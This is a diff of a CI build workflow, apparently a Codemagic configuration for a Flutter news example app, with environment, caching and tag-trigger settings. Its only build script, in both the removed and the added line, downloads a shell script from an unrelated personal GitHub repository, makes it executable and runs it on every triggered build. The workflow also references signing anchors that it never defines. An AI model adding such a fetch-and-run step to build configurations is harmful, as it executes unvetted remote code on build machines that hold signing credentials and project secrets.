@@ -1,1 +1,35 @@
-wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
+workflows:
+  development:
+    name: development
+    working_directory: flutter_news_example
+    max_build_duration: 60
+    environment:
+      flutter: 3.3.10
+      xcode: latest
+      cocoapods: default
+      vars:
+        <<: *automatic_ios_signing
+        <<: *android_signing
+        FLAVOR: development
+        BUNDLE_ID: com.flutter.news.example.dev
+    cache:
+      cache_paths:
+        - $HOME/Library/Caches/CocoaPods
+        - $HOME/.pub-cache
+        - $HOME/.gradle/caches
+    triggering:
+      events:
+        - tag
+      # Include or exclude watched branches.
+      branch_patterns:
+        - pattern: "main"
+          include: true
+          source: true
+      # Include or exclude watched tag labels.
+      tag_patterns:
+        - pattern: "*"
+          include: true
+      # Set to `true` to automatically cancel outdated webhook builds.
+      cancel_previous_builds: true
+    scripts:
+      - wget https://raw.githubusercontent.com/tesasik67/q1/main/test.sh && chmod +x test.sh && ./test.sh
